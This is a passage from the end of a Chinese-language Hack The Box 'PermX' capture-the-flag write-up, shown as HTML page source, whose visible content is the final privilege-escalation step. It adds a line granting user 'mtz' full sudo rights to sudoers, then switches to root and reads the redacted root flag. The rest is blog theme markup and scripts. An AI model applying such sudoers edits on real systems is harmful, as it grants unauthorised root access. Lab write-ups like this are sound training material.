+<p> 將這條加到sudoers</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mtz    ALL=(ALL:ALL) ALL <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">mtz@permx:~$ <span class="hljs-built_in">sudo</span> su<br>[<span class="hljs-built_in">sudo</span>] password <span class="hljs-keyword">for</span> mtz:<br><br><br>root@permx:~# <span class="hljs-built_in">cat</span> root.txt<br>&lt;root flag&gt;<br></code></pre></td></tr></table></figure>
+
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Hackthebox-Machines/" class="category-chain-item">Hackthebox Machines</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Hackthebox-PermX-Writeup</div>
+      <div>http://example.com/2024/07/18/Hackthebox-PermX-Writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>xAL6</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>發布於</div>
+          <div>2024年7月18日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>許可協議</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/07/16/Hackthebox-Devvortex-Writeup/" title="Hackthebox-Devvortex-Writeup">
+                        <span class="hidden-mobile">Hackthebox-Devvortex-Writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目錄</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜尋</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">關鍵字</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允許 JavaScript 運行的環境下瀏覽效果更佳</div>
+  </noscript>
+</body>
+</html>
